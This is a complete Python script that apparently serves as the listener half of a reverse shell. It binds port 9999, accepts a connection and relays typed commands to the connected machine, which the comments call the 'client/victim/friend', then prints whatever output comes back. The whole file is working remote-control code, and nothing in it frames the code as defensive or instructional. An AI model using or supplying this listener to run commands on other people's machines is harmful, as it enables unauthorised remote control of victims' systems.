import socket
import sys

#create a socket
def createSocket():
    try:
        global host
        global port
        global s

        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print(f"socket creation error{str(msg)}")


#bind the socket to ip and port and listening for connections
def bindSocket():
    try:
        global host
        global port
        global s

        print(f"binding the port {port}")

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print(f"cannot bind..{str(msg)} \n retrying..!")
        bindSocket()


#Establishing the connection with the client by accepting
def acceptConnection():
    conn, addr = s.accept()
    print("Connection has been established.!")
    print(f"Ip Address: {addr[0]}")
    print(f"Port: {str(addr[1])}")
    sendCommands(conn)
    conn.close()

#send commands to client/victim/friend
def sendCommands(conn):
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()

        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")


def main():
    createSocket()
    bindSocket()
    acceptConnection()

if __name__ == "__main__":
    main()